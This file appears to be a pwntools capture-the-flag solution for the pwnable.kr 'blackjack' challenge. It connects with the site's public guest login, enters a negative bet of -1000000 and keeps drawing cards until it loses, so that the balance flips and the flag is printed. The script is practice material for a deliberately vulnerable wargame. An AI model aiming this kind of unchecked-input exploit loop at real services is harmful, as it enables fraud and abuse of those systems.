#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user blackjack
from pwn import *

# Set up pwntools for the correct architecture
exe = "/path/to/exe"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'blackjack'
password = args.PASSWORD or 'guest'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        raise Exception("GDB not supported in remote mode")
    else:
        return shell.connect_remote("0.0.0.0", 9009)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

PREFIX = b"\033[2J\033[1;1H"
retry = True

while retry:
    io = start()
    io.sendlineafter(b"(Y/N)", b"Y")  # ready
    io.sendlineafter(b"Choice", b"1")  # start game
    io.sendlineafter(b"Enter Bet: $", b"-1000000")

    while True:
        l = io.recvline_contains((b"Please Enter H to Hit or S to Stay.", b"Awesome!"))
        if b"Awesome!" in l:
            if b"1 Wins" in l:
                info("accidentally won... retrying.")
            else:
                retry = False
            break
        else:
            io.sendline(b"H")  # hit!
    
io.sendlineafter(b"Please Enter Y for Yes or N for No\n", b"Y")

success(f"flag = {term.text.bold_italic_yellow(io.recvline().strip().removeprefix(PREFIX).decode())}")
